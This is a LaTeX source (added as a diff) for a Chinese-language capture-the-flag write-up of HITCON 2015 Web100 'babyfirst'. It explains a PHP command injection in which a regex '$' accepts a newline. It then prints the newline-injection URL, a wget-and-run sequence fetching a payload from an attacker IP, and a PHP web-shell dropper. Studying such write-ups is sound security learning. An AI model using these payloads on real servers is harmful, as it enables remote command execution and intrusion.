@@ -1,0 +1,151 @@
+%!TEX program = xelatex
+\documentclass[a4paper,UTF8]{ctexart}
+
+\usepackage{fontspec}
+\usepackage{amsmath}
+\usepackage{float}
+\usepackage{graphicx}
+\usepackage{amssymb}
+\usepackage{epstopdf}
+\usepackage{mathrsfs}
+%\usepackage{stmaryrd}
+\usepackage{color}
+\usepackage{listings}
+\usepackage{ulem}
+\usepackage{lmodern}
+\usepackage{fontenc}
+\usepackage[margin=2cm]{geometry}
+\usepackage{titlesec}
+\usepackage{tikz}
+\usepackage{hyperref}
+\usepackage[noblocks]{authblk}
+
+%\setlength{\parskip}{5pt}
+%
+%\usepackage{MyTitle}
+%\titleformat{\section}[hang]{\bfseries\fontsize{16pt}{0pt}\selectfont}{\thesection}{.5em}{}{}
+
+
+% 对于使用 Tex Pad 打开本 TeX 文档的用户，请使用这行代码
+\usepackage[cache=false,outputdir=.texpadtmp]{minted}
+% 其它用户使用这行
+%\usepackage{minted}
+%
+
+
+
+%To do: 修改标题和作者及联系方式
+\title{HITCON2015 Quals, Web100, babyfirst}
+
+\author{张琦}
+\affil{哈尔滨工业大学，计算机科学与技术学院，peterqi37@hit.edu.cn}
+
+\date{}
+
+\begin{document}
+\maketitle
+
+
+%------------------------------------------------------------------------------------------------------------------------------
+%------------------------------------------------------------------------------------------------------------------------------
+%To do: 正文开始
+%------------------------------------------------------------------------------------------------------------------------------
+%------------------------------------------------------------------------------------------------------------------------------
+
+\section{题目描述}
+
+本题是web范畴一道分值为 100 的题目，其描述如下：\\
+
+\begin{quizdesc}[label=Web100 babyfirst]
+baby, do it first.
+http://52.68.245.164
+\end{quizdesc}
+
+这道题目比较有趣，网页进去之后并不是一个正常用户使用的网站，我们看到的直接就是网页源码。
+
+\begin{minted}{php}
+<?php
+    highlight_file(__FILE__);
+
+    $dir = 'sandbox/' . $_SERVER['REMOTE_ADDR'];
+    if ( !file_exists($dir) )
+        mkdir($dir);
+    chdir($dir);
+
+    $args = $_GET['args'];
+    for ( $i=0; $i<count($args); $i++ ){
+        if ( !preg_match('/^\w+$/', $args[$i]) )
+            exit();
+    }
+    exec("/bin/orange " . implode(" ", $args));
+?>
+\end{minted}
+
+\section{解题思路}
+
+\subsection{程序运行流程}\label{program-workflow}
+
+分析一下这个代码，可以发现第一句\code{highlight\_file(\_\_FILE\_\_)}是输出php源代码的原因，除了源代码本页面没有任何输出。
+
+然后在网站的sandbox文件夹下，如果不存在以访客ip为名的文件夹则建立一个，然后切换至该文件夹。
+
+然后以get的形式传进args参数，如果args为数组，则对于args数组中的每一个元素进行正则匹配，要求是数字字母下划线，如果有任意一个元素匹配失败，则网页退出；如果args为一个字符串，则仅对这一个字符串进行匹配。
+
+最后如果网页没有退出，则将args数组中的元素以单个空格隔开生成一个字符串衔接到/bin/orange 后面，调用系统shell执行该语句。
+
+\subsection{漏洞分析}
+
+首先要解决的是要将args参数以数组的形式传递进来，否则经过本机的调试，implode函数会因为args只有一个元素而报错。在网上搜寻了一些方法之后，了解到args参数可以以如下形式传递http://52.68.245.164?args[]=123\&args[]=456\&args[]=789，如此便可传进一个含有三个元素的数组args，三个元素分别为123、456、789三个字符串。
+
+根据程序可知，如果正常衔接参数，最终就会是运行一个叫orange的程序，在程序后面加一些参数，参数还必须是数字字母下划线。可是orange到底是干什么的呢？橘子橘子橘子橘子。。。
+
+最后看题解提高了姿势水平，明白了这道题目的关键点，在正则匹配/\^{}$\backslash$w+\$/中，\$可以匹配到换行符！这就意味着，我们在orange后面输出了一个换行符，然后就可以执行我们自己的命令了！
+
+之后的解法就是仁者见仁智者见智了，可以调用linux的命令从我们的ip下载木马脚本到服务器目录下，木马脚本是一些系统命令，把输出重定向到另一文本文件中，然后我们可以直接到sandbox/我们的ip下下载该输出文件。
+
+另一种解法是下载php木马，然而却无法执行该文件，因为无法传入".php"后缀；于是可以使用tar命令将php命令打包成一个未压缩的包，然后使用php运行该包，就成功地运行了php 木马，执行任意命令。
+
+还有一种是使用twistd telnet命令，这条命令似乎是可以将一个python shell绑定到4040端口上，用户名密码默认为admin$\backslash$changeme，不过这种有些高大上，本人还未能弄清楚。
+
+\section{解题过程（使用php木马方法）}
+
+\subsection{第一步：验证\$匹配换行符成功}
+
+http://52.68.245.164?args[]=a\%0A\&args[]=touch\&args[]cat\\
+\code{/bin/orange a\\*
+touch cat}
+
+于是在我们的网站目录下出现了cat文件，证明我们的想法正确。
+
+\subsection{第二步：下载木马并执行}
+
+执行的shell命令如下：\\
+code{mkdir exploit\\cd exploit\\
+wget 92775836(这个数字是题解队伍的长整形ip地址，因为不能输入"."，因此要这样输入ip地址)\\
+tar cvf archived exploit（打包命令）\\
+php archived}
+
+下载的exploit如下：
+
+\begin{minted}{php}
+<?php
+file_put_contents('shell.php', '
+    <?php
+    header("Content-Type: text/plain");
+    print shell_exec($_GET["cmd"]);
+    ?>
+');
+?>
+\end{minted}
+
+
+\subsection{第三步：后续命令}
+访问木马php网页shell.php，使用get传递cmd命令，可以直接看到shell返回的输出。
+
+最后在服务器的根目录下发现了Flag：\code{hitcon\{theworldisnotbeautiful,becauseofyou\}}
+
+\section{致谢}
+
+感谢ISpamAndHex, Plaid Parliament of Pwning, p4队伍的题解！本人受益良多。
+
+\end{document}
